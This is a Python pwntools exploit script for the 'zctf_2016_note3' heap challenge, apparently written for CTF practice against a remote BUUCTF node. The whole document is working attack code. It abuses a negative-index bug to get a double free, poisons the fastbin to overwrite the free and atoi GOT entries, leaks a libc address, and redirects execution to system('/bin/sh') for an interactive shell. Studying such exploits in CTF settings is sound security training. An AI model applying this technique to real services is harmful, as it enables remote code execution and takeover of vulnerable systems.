from pwn import *

#context.log_level = 'debug'

#p = process('./zctf_2016_note3')
p = remote('node4.buuoj.cn', 27007)
elf = ELF('zctf_2016_note3')
libc = ELF('libc-2.23.buu.so')

def debug(s):
    gdb.attach(p, '''
        source ~/libc/loadsym.py
        loadsym ~/libc/2.23/64/libc-2.23.debug.so
    ''' + s)

def alloc(size, content):
    p.sendlineafter(b'--->>\n', b'1')
    p.sendlineafter(b'(less than 1024)\n', str(size).encode())
    p.sendlineafter(b'content:\n', content)

def edit(index, content):
    p.sendlineafter(b'--->>\n', b'3')
    p.sendlineafter(b'id of the note:\n', str(index).encode())
    p.sendlineafter(b'new content:\n', content)

def delete(index):
    p.sendlineafter(b'--->>\n', b'4')
    p.sendlineafter(b'id of the note:\n', str(index).encode())

heaparray = 0x6020C8
lenarray = 0x6020C0

alloc(0x60, b'a') #0 c0
alloc(0x60, b'a') #1 c1
alloc(0x100, b'a') #2 c2
alloc(0x10, b'a') #3 c3 avoid chunk merge
edit(2, b'a') #c2
delete(-9223372036854775808) #chunk2 -> unsorted bin
edit(1, b'a') #c1

delete(-9223372036854775808) #c1 -> chunk1 -> free
delete(0) #chunk0 -> free
delete(1) #chunk1 -> free

alloc(0x60, p64(heaparray - 0x1b)) #0
alloc(0x60, b'a') #1
alloc(0x60, b'a') #4
alloc(0x60, b'a' * 0xb + p64(elf.got['free']) + p64(elf.got['atoi'])[:7]) #5

#leak libc
edit(0, p64(elf.plt['puts'])[:7])
delete(2)

libc_base = u64(p.recv(6).ljust(8, b'\x00')) - 0x68 - libc.sym['__malloc_hook']
system = libc_base + libc.sym['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh'))
success('libc_base -> {}'.format(hex(libc_base)))

edit(1, p64(system)[:7])
p.sendlineafter(b'--->>\n', b'/bin/sh\x00')

p.interactive()